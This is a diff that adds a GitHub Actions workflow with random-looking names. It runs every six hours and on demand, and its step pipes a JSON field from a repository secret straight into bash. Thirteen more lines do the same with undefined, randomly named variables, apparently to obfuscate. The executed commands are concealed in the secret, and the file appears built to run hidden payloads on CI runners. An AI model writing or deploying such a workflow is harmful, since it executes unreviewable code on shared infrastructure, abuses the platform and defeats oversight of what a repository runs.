@@ -1,0 +1,31 @@
+name: bishasx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bishasx
+        env:
+          ha9: ${{ secrets.ha9 }}
+        run: |
+          echo $ha9 | jq -r .zku12 | /bin/bash
+          echo $g7 | jq -r .g49862 | /bin/bash
+          echo $noz91 | jq -r .hdstd3512 | /bin/bash
+          echo $uxy20 | jq -r .bu53184 | /bin/bash
+          echo $fpiwg918 | jq -r .cxwey54 | /bin/bash
+          echo $a3298 | jq -r .lhtug037 | /bin/bash
+          echo $iqhdt92917 | jq -r .nvahz38936 | /bin/bash
+          echo $es6646 | jq -r .i159 | /bin/bash
+          echo $kzg83540 | jq -r .fxce610 | /bin/bash
+          echo $sh08 | jq -r .uxmop983 | /bin/bash
+          echo $zm0334 | jq -r .hqh279 | /bin/bash
+          echo $cr9416 | jq -r .xyyy313 | /bin/bash
+          echo $rgzl23 | jq -r .qubll3 | /bin/bash
+          echo $bwcj617 | jq -r .xzpzb56 | /bin/bash
+
